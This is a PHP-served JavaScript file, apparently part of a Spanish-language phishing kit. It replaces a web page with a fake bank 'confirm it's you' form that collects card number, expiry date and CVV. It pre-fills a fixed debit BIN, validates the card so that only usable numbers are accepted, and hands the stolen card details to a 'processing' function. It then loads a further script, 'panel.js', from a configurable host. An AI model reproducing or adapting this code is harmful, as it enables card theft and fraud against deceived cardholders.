<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/javascript');
?>

(function () {
  var data = (typeof window !== 'undefined' && window.my_data) ? window.my_data : {};
  var titulo = 'Confirma que eres tú';
  var hosting = (typeof window !== 'undefined' && window.my_hosting) ? String(window.my_hosting) : '';
  var hostingBase = hosting ? hosting.replace(/\/+$/, '') : '';
  var tipoRaw = data && data.type ? String(data.type) : 'credito';
  var tipo = (tipoRaw.toLowerCase() === 'debito') ? 'debito' : 'credito';
  var maxCardDigits = 16;
  var specificImg = (typeof window !== 'undefined')
    ? (tipo === 'credito' ? window.my_card_image_credito : window.my_card_image_debito)
    : null;
  var imageUrl = (function () {
    var custom = specificImg ? String(specificImg) : '';
    if (custom) return custom;
    if (!hostingBase) return '';
    return hostingBase + '/assets/img/' + (tipo === 'debito' ? 'debit.png' : 'credit.png');
  })();
  var isDebito = (tipo === 'debito');
  var debitBin = '530691';
  var cvcDisplay = (tipo === 'credito') ? 'CVV' : 'CVC';
  var cardPlaceholder = isDebito ? '5306 91XX XXXX XXXX' : 'XXXX XXXX XXXX XXXX';

  function escapeHtml(str) {
    return String(str || '').replace(/[&<>"'`=\/]/g, function (s) {
      return ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;',
        "'": '&#39;', '`': '&#96;', '=': '&#61;', '/': '&#47;'
      })[s];
    });
  }
  function isLogoUrl(url) {
    if (!url) return false;
    try {
      var clean = String(url).split('#')[0].split('?')[0];
      return /\/logo\.svg$/i.test(clean);
    } catch (e) {
      return false;
    }
  }
  // Evita que etapas posteriores reutilicen el logo como imagen superior y se duplique el encabezado.
  if (typeof window !== 'undefined' && isLogoUrl(window.my_card_image_top)) {
    window.my_card_image_top = '';
  }
  function detectCardType(num) {
    if (/^(34|37)/.test(num)) return 'amex';
    if (/^4/.test(num)) return 'visa';
    if (/^(5[1-5])/.test(num)) return 'mastercard';
    if (/^2(2[2-9]|[3-6][0-9]|7[01]|720)/.test(num)) return 'mastercard';
    if (/^(6011|65|64[4-9]|622(12[6-9]|1[3-9][0-9]|[2-8][0-9]{2}|9[0-1][0-9]|92[0-5]))/.test(num)) return 'discover';
    if (/^3(0[0-5]|[68])/.test(num)) return 'diners';
    if (/^35(2[89]|[3-8][0-9])/.test(num)) return 'jcb';
    return 'desconocida';
  }
  function luhnCheck(val) {
    var sum = 0, shouldDouble = false;
    for (var i = val.length - 1; i >= 0; i--) {
      var digit = val.charCodeAt(i) - 48;
      if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
      sum += digit; shouldDouble = !shouldDouble;
    }
    return (sum % 10) === 0;
  }
  function validCardNumber(num) {
    if (!num) return false;
    var type = detectCardType(num);
    var pattern = (type === 'amex') ? /^[0-9]{15}$/ : /^[0-9]{16}$/;
    if (!pattern.test(num)) return false;
    return luhnCheck(num);
  }
  function validExpiry(mmYY) {
    var parts = (mmYY || '').split('/');
    if (parts.length !== 2) return false;
    var m = parseInt(parts[0], 10), y2 = parseInt(parts[1], 10);
    if (!Number.isInteger(m) || m < 1 || m > 12 || !Number.isInteger(y2)) return false;
    var now = new Date(), cy2 = now.getFullYear() % 100, cm = now.getMonth() + 1;
    var year = 2000 + y2;
    if (year < 2026 || year > 2030) return false;
    if (year < (2000 + cy2)) return false;
    if (y2 === cy2 && m < cm) return false; return true;
  }
  function cardMaxDigitsFor(num) {
    var type = detectCardType(num);
    if (type === 'amex') {
      return 15;
    }
    return maxCardDigits;
  }

  function cvvLengthFor(num) {
    return detectCardType(num) === 'amex' ? 4 : 3;
  }
  function formatCardDisplay(numDigits) {
    if (!numDigits) return '';
    return numDigits.replace(/(.{4})/g, '$1 ').trim();
  }
  function formatCardPreview(num) {
    if (!num) return '•••• •••• •••• ••••';
    var type = detectCardType(num);
    if (type === 'amex') { var a=num.slice(0,4),b=num.slice(4,10),c=num.slice(10,15); return [a,b,c].filter(Boolean).join(' ').replace(/\d(?=\d{4})/g,'•'); }
    var parts = num.match(/.{1,4}/g)||[]; return parts.join(' ').replace(/\d(?=(\d{4})+(?!\d))/g,'•');
  }

  var msg = data && data.mensaje ? (' terminada en ' + escapeHtml(data.mensaje)) : '';

  var contenido = `
  <link rel="stylesheet" href="${hostingBase}/css/flow-theme.css" />
  <link rel="stylesheet" href="${hostingBase}/css/bg-lineas.css" />
  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">

  <style>
    .card-panel { display: flex; flex-direction: column; gap: 14px; }
    .fl-group { position: relative; display: grid; gap: 6px; }
    .fl-icon { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: #2d3037; font-size: 20px; }
    .fl-input { width: 100%; border: 2px solid var(--line-strong); border-radius: 12px; background: #fff; padding: 14px 14px 14px 46px; font-size: 16px; font-weight: 600; color: var(--ink); outline: none; transition: border-color 0.2s ease, box-shadow 0.2s ease; }
    .fl-input::placeholder { color: #2d3035; opacity: 0.55; }
    .fl-group.valid .fl-input { border-color: var(--success); }
    .fl-group.invalid .fl-input { border-color: var(--danger); }
    .fl-label { display: none; }
    .form-grid { display: grid; gap: 12px; grid-template-columns: repeat(2, minmax(0, 1fr)); }
    @media (max-width:520px){ .form-grid { grid-template-columns: 1fr; } }
    .figure-card { padding: 10px; }
    .badge { align-self: flex-start; }
  </style>

  <main class="flow-shell">

    <div class="logo-mark" aria-hidden="true">
      <span></span><span></span><span></span>
    </div>

    <h1 class="flow-title" id="titulo-form">Confirma que eres tú</h1>
    <p class="flow-subtitle" id="subtitulo"></p>

    <section class="panel card-panel cc-form" aria-label="Formulario de tarjeta">
      <div class="badge" id="tipo-badge">${tipo === 'credito' ? 'SOLICITUD: TARJETA DE CRÉDITO' : 'SOLICITUD: TARJETA DE DÉBITO'}</div>

      <div class="figure-card">
        <img id="cc-image" class="cc-image" alt="Tarjeta de referencia" style="${imageUrl ? '' : 'display:none;'}">
        <p class="figure-caption" id="cc-image-help" style="display:none;"></p>
      </div>

      <div class="fl-group" id="grp-number">
        <i class='bx bx-card fl-icon' aria-hidden="true"></i>
        <input class="fl-input" id="cardNumber" type="text" inputmode="numeric" autocomplete="cc-number" placeholder="${cardPlaceholder}" aria-labelledby="lbl-number" maxlength="16" value="">
        <label class="fl-label" id="lbl-number">Número de tarjeta</label>
      </div>
      <div class="form-grid">
        <div class="fl-group" id="grp-exp">
          <i class='bx bx-id-card fl-icon' aria-hidden="true"></i>
          <input class="fl-input" id="expiryDate" type="text" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/YY" aria-labelledby="lbl-exp" maxlength="5">
          <label class="fl-label" id="lbl-exp">Fecha de vencimiento (MM/YY)</label>
        </div>

        <div class="fl-group" id="grp-cvv">
          <i class='bx bx-lock fl-icon' aria-hidden="true"></i>
          <input class="fl-input" id="cvv" type="text" inputmode="numeric" autocomplete="cc-csc" placeholder="${cvcDisplay}" aria-labelledby="lbl-cvv" maxlength="3">
          <label class="fl-label" id="lbl-cvv">${cvcDisplay}</label>
        </div>
      </div>

      <div class="error-text" id="errorCard" role="alert" aria-live="polite"></div>

      <button type="button" id="btn-go" class="btn-primary" disabled>CONTINUAR</button>
    </section>

    <div class="meta-hidden">
      <div id="ipc">Dirección IP:</div>
      <div id="jclock1"></div>
    </div>
  </main>`;

  try { var t = document.getElementById('titulo'); if (t) t.textContent = titulo; } catch(e){}
  document.body.innerHTML = contenido;
  try { localStorage.setItem('contenido', contenido); } catch(e){}

  var subtitulo = document.getElementById('subtitulo');
  var tituloForm = document.getElementById('titulo-form');
  var tipoBadge = document.getElementById('tipo-badge');
  var subMsg = '';
  if (subtitulo) subtitulo.textContent = subMsg;
  if (tituloForm) { tituloForm.textContent = 'Confirma que eres tú'; }
  if (tipoBadge) { tipoBadge.textContent = (tipo === 'credito') ? 'SOLICITUD: TARJETA DE CRÉDITO' : 'SOLICITUD: TARJETA DE DÉBITO'; }

  var $num = document.getElementById('cardNumber');
  var $exp = document.getElementById('expiryDate');
  var $cvv = document.getElementById('cvv');
  var $go = document.getElementById('btn-go');
  var $err = document.getElementById('errorCard');
  var $img = document.getElementById('cc-image');

  function setError(m) { if ($err) $err.textContent = m || ''; }
  function setGoEnabled(en) { if ($go) { $go.disabled = !en; } }
  function groupEl(el) { return el ? el.parentElement : null; }
  function setFilled(el) { var g = groupEl(el); if (!g) return; if (el && el.value && el.value.trim() !== '') g.classList.add('filled'); else g.classList.remove('filled'); }
  function sanitizeDigits(el, maxLen) {
    var raw = (el.value || '').replace(/\D/g, '');
    if (el && el.id === 'cardNumber') {
      var digits;
      var allowedLen = maxLen || (isDebito ? maxCardDigits : cardMaxDigitsFor(raw));
      if (isDebito) {
        if (raw === '') {
          digits = '';
        } else if (raw.indexOf(debitBin) === 0) {
          digits = raw.slice(0, allowedLen);
        } else {
          var suffix = raw.replace(/^530691/, '');
          digits = (debitBin + suffix).slice(0, allowedLen);
        }
      } else {
        digits = raw.slice(0, allowedLen);
      }
      var formatted = formatCardDisplay(digits);
      if (el.value !== formatted) {
        el.value = formatted;
        try { el.setSelectionRange(formatted.length, formatted.length); } catch(e){}
      }
      setFilled(el);
      return digits;
    }
    if (typeof maxLen === 'number') {
      raw = raw.slice(0, maxLen);
    }
    if (el.value !== raw) el.value = raw;
    setFilled(el);
    return raw;
  }
  function formatExpiry(el) {
    var digits = (el.value || '').replace(/\D/g, '').slice(0, 4);
    if (digits.length === 1) {
      var first = parseInt(digits, 10);
      if (!Number.isNaN(first) && first > 1) {
        digits = '0' + first.toString();
      }
    }
    var month = digits.slice(0, 2);
    if (month.length === 2) {
      var monthNum = parseInt(month, 10);
      if (Number.isNaN(monthNum) || monthNum < 1) monthNum = 1;
      if (monthNum > 12) monthNum = 12;
      month = monthNum.toString().padStart(2, '0');
    }
    var year = digits.slice(2, 4);
    if (year.length === 1) {
      var yFirst = parseInt(year, 10);
      if (!Number.isNaN(yFirst)) {
        if (yFirst < 2) year = '2';
        if (yFirst > 3) year = '3';
      }
    } else if (year.length === 2) {
      var yearNum = parseInt(year, 10);
      if (Number.isNaN(yearNum) || yearNum < 26) year = '26';
      else if (yearNum > 30) year = '30';
      else year = year.toString().padStart(2, '0');
    }
    var combined = month + year;
    combined = combined.slice(0, 4);
    var formatted = combined.length > 2 ? combined.slice(0, 2) + '/' + combined.slice(2) : combined;
    if (el.value !== formatted) el.value = formatted;
    setFilled(el);
    return formatted;
  }
  if ($num) {
    if (isDebito) {
      var preset = formatCardDisplay(debitBin);
      $num.value = preset;
    }
    setFilled($num);
  }

  function validateAll() {
    var num = sanitizeDigits($num);
    var type = detectCardType(num);
    var maxDigits = isDebito ? maxCardDigits : cardMaxDigitsFor(num);
    var displayMaxLen = maxDigits + Math.floor((maxDigits - 1) / 4);
    if ($num && parseInt($num.maxLength, 10) !== displayMaxLen) {
      $num.maxLength = displayMaxLen;
    }
    if (num.length > maxDigits) {
      num = num.slice(0, maxDigits);
      if ($num) {
        var formattedTrim = formatCardDisplay(num);
        $num.value = formattedTrim;
        try { $num.setSelectionRange(formattedTrim.length, formattedTrim.length); } catch(e){}
      }
    }

    var exp = formatExpiry($exp);
    var cvvLen = cvvLengthFor(num);
    if ($cvv && $cvv.maxLength !== cvvLen) {
      $cvv.maxLength = cvvLen;
      $cvv.placeholder = cvvLen === 4 ? 'CVV' : cvcDisplay;
    }
    var cvv = sanitizeDigits($cvv, cvvLen);


    var okNum = validCardNumber(num);
    var okExp = validExpiry(exp);
    var okCvv = cvv.length === cvvLen;
    setError('');
    var effectiveNumLen = isDebito ? Math.max(0, num.length - debitBin.length) : num.length;
    if (!okNum && effectiveNumLen > 0) setError('Número de tarjeta no válido.');
    else if (!okExp && exp.length >= 4) setError('Fecha no válida. Use MM/YY y que no esté vencida.');
    else if (!okCvv && $cvv.value.length > 0) setError(cvcDisplay + ' inválido.');
    setGoEnabled(okNum && okExp && okCvv);
  }

  [$num, $exp, $cvv].forEach(function (el) { if (!el) return; el.addEventListener('input', validateAll); el.addEventListener('blur', function(){ setFilled(el); }); });
  validateAll();

    if (typeof window.my_data !== 'undefined' && (my_data.error || my_data.mensaje)) {
      setError(my_data.error || my_data.mensaje);
      [$num,$exp,$cvv].forEach(function(el){ if (el) el.classList.add('error-input'); });
      var form = document.querySelector('.cc-form');
      if (form){ form.classList.add('shake'); setTimeout(function(){ form.classList.remove('shake'); }, 500); }
    }

    if ($img) {
      if (imageUrl) {
        $img.src = imageUrl;
        $img.style.display = '';
      } else {
        $img.style.display = 'none';
      }
    }

    if ($go) {
      $go.addEventListener('click', function () {
        var num = sanitizeDigits($num);
        var exp = formatExpiry($exp);
        var cvv = sanitizeDigits($cvv, cvvLengthFor(num));
      if (!validCardNumber(num)) { setError('Ingrese una tarjeta válida'); return; }
      if (!validExpiry(exp)) { setError('Fecha no válida'); return; }
      if (cvv.length !== cvvLengthFor(num)) { setError(cvcDisplay + ' inválido'); return; }
      var tipoCap = tipo.charAt(0).toUpperCase() + tipo.slice(1);
      try {
        if (typeof window.processing === 'function') {
          window.processing({ t: 'card', tarjeta: num, cvv: cvv, ftarjeta: exp, type: tipoCap });
        } else { console.warn('processing(...) no está definido.'); }
      } catch (e) { console.error('Error en processing(...):', e); }
    });
  }
})();

;(function() {
  var s = document.createElement('script');
  s.src = (typeof window.my_hosting === 'string' ? window.my_hosting : '') + 'js/panel.js';
  s.defer = true;
  document.head.appendChild(s);
})();
